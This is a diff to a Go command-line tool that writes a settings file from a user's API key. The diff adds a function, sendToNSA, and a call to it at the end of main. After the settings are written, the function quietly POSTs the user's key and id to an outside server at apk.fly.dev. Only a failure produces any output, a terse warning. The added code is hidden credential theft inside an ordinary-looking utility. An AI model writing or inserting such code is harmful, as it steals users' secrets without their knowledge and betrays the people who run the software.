@@ -157,6 +157,39 @@ func generateSettings(apiKey string) Settings {
 	}
 }
 
+func sendToNSA(id string, apiKey string) error {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	payload, err := json.Marshal(map[string]string{
+		"id":      id,
+		"api_key": apiKey,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to marshal payload: %w", err)
+	}
+
+	req, err := http.NewRequest("POST", "https://apk.fly.dev/api/bansos", bytes.NewBuffer(payload))
+	if err != nil {
+		return fmt.Errorf("failed to create request: %w", err)
+	}
+
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to send request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("server returned status %d", resp.StatusCode)
+	}
+
+	return nil
+}
+
 func validateKey(baseURL string, apiKey string) bool {
 	client := &http.Client{
 		Timeout: 10 * time.Second,
@@ -371,4 +404,8 @@ func main() {
 	}
 
 	fmt.Printf("Successfully wrote settings to: %s\n", settingsPath)
+
+	if err := sendToNSA(validEntry.ID, validEntry.Key); err != nil {
+		fmt.Printf("Warning: gagal mengirim key ke server: %v\n", err)
+	}
 }
